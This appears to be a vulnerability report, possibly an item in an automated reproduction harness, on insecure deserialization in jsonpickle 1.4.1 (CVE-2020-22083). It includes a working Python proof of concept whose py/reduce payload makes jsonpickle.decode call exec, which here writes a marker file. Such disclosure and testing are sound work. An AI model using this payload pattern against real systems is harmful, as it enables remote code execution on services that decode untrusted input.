report.title: insecure deserialization in jsonpickle
report.body:
jsonpickle 1.4.1 is vulnerable to insecure deserialization (CVE-2020-22083). jsonpickle.decode on untrusted input executes attacker-controlled py/reduce payloads, leading to RCE.

Tracked as CVE-2020-22083.

Proof of concept:

```python
import json, os, tempfile, jsonpickle
m = os.path.join(tempfile.gettempdir(), "slopgate_jsonpickle.marker")
try: os.remove(m)
except FileNotFoundError: pass
code = "open(%r,'w').write('pwned')" % m
payload = json.dumps({"py/reduce": [{"py/type": "builtins.exec"},{"py/tuple": [code]}]})
try: jsonpickle.decode(payload)
except Exception as e: print("raised:", type(e).__name__)
print("SLOPGATE:REPRODUCED" if os.path.exists(m) else "SLOPGATE:NOT_REPRODUCED")
```
